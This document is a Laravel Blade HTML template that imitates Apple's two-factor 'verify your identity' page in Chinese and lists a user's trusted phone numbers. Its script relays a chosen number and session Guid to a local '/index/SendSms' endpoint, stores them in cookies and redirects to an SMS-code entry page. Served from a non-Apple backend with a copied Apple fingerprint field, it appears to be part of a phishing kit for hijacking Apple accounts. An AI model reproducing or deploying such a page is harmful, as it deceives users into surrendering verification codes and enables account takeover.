<html dir="ltr" data-rtl="false" lang="en" class="prefpane na-presentation form-mouseuser">
<head>
    <title></title>
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="{{ asset('/fonts/fontss.css') }}" type="text/css">

    <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/auth.css') }}">
    <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/phone-list.css') }}">
    <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
    <style type="text/css"></style>
    <style data-id="immersive-translate-input-injected-css">
        .tk-callout {
            font-size: 24px;
            line-height: 1.16667;
            font-weight: 600;
            letter-spacing: .009em;
            font-family: SF Pro Display, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
        }
    </style>
</head>

<body class="tk-body ">


<div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">

    <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
        <div class="widget-container  fade-in restrict-min-content safari-browser restrict-max-wh  fade-in "
             data-mode="inline" data-isiebutnotedge="false">

            <div id="step" class="si-step">
                <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section">

                </logo>
                <div id="stepEl" class="">
                    <div class="sk7">
                        <hsa2-sk7>
                            <div class="sa-sk7__container">
                                <div class="choose-phone">
                                    <div class="sa-sk7__app-title">
                                        <h2 class="tk-callout" tabindex="-1">验证你的身份</h2>
                                    </div>
                                    <div class="sa-sk7__content">
                                        <div class="choose-phone__device-list">
                                            <div class="form-tooltip-textbox-wrapper">
                                                <div class="form-tooltip form-tooltip-validation">
                                                    <div aria-hidden="true" class="form-tooltip-info" role="tooltip">
                                                        <p class="form-tooltip-content"></p>
                                                    </div>
                                                </div>
                                                <div class="devices">
                                                    <ul class="container si-field-container si-device-container"
                                                        style="list-style: none;">

                                                        @foreach($trustedPhoneNumbers as $phone)
                                                            <li class="ax-outline no-gutter si-device-row ">
                                                                <button class="si-device-row"
                                                                        aria-describedby="deviceInfo2"
                                                                        style="width: 100%; outline: none; display: block;" onclick="sendCode('{{ $phone->getId() }}','{{$phone->getNumberWithDialCode()}}')">
                                                                    <div class="si-pointer">
                                                                        <div class="large-11 small-11 si-device-desc"
                                                                             style="padding-left: 15px;">
                                                                            <div aria-hidden="true"
                                                                                 class="si-device-name force-ltr">{{ $phone->getNumberWithDialCode() }}
                                                                            </div>
                                                                            <div class="si-device-meta tk-subbody">短信
                                                                            </div>
                                                                        </div>
                                                                        <div class="large-1 small-1">
                                                                            <div class="img arrow">
                                                                                <i class="shared-icon icon_right_chevron"></i>
                                                                            </div>
                                                                        </div>
                                                                        <span class="sr-only" id="deviceInfo2">number ending with 24</span>
                                                                    </div>
                                                                    <div class="si-focus-outline"></div>
                                                                </button>
                                                            </li>
                                                        @endforeach
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="signin-container-footer">
                                            <div class="signin-container-footer__info">请选择一个电话号码接收验证码。
                                            </div>
                                            <div class="fixed-h">
                                                <div class="signin-container-footer__link">
                                                    <div class="text text-typography-body-reduced">
                                                        <div class="inline-links">
                                                            <div class="inline-links__link">
                                                                <button
                                                                    class="button button-link button-rounded-rectangle"
                                                                    type="button"
                                                                    onclick="window.open('https://iforgot.apple.com', '_blank');"
                                                                ><span
                                                                        class="text text-typography-body-reduced">无法使用这些电话号码 ?</span><span
                                                                        class="sr-only">Opens in a new window.</span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </hsa2-sk7>
                    </div>
                </div>
            </div>
            <div id="stocking" style="display:none !important;"></div>

        </div>
        <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
        </idms-modal>
    </apple-auth>
</div>

<script >

    const date = new Date();
    date.setTime(date.getTime()+(60*1000*10));

    const phoneCount = {{ $trustedPhoneNumbers->count() }};
    document.cookie = `phoneCount=${phoneCount}; expires=${date}`;

    function sendCode (id,phone){

        const Guid = getGrid('Guid');
        if (Guid === null) {
            return window.location.href = '/';
        }

        fetch('/index/SendSms', {
            method: 'Post',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ Guid:Guid,ID:  id}),
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                return response.json();
            })
            .then(response => {

                if (response.code === 200) {
                    document.cookie = `ID=${id}; expires=${date}`;
                    document.cookie = `Number=${phone}; expires=${date}`;
                    document.cookie = `Guid=${Guid}; expires=${date}`;
                    return window.location.href = '/index/sms?Number='+phone;
                }

                return window.location.href = '/';
            })
            .catch(error => {
                console.error('There was a problem with the fetch operation:', error);
                return window.location.href = '/';
            });
    }

    const getGrid = (name) => {
        const cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].split('=');
            if (cookie[0] === name) {
                return decodeURIComponent(cookie[1]);
            }
        }
        return null;
    }

</script>

<input type="hidden" id="fdcBrowserData"
       value="{&quot;U&quot;:&quot;Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1&quot;,&quot;L&quot;:&quot;en&quot;,&quot;Z&quot;:&quot;GMT+08:00&quot;,&quot;V&quot;:&quot;1.1&quot;,&quot;F&quot;:&quot;Fla44j1e3NlY5BNlY5BSmHACVZXnNA9d7FS_.ue.1zLu_dYV6Hycfx9MsFY5Bhw.Tf5.EKWJ9VbSIXexGMudMsTclY5BNleBBNlYCa1nkBMfs.98x&quot;}">
</body>
</html>
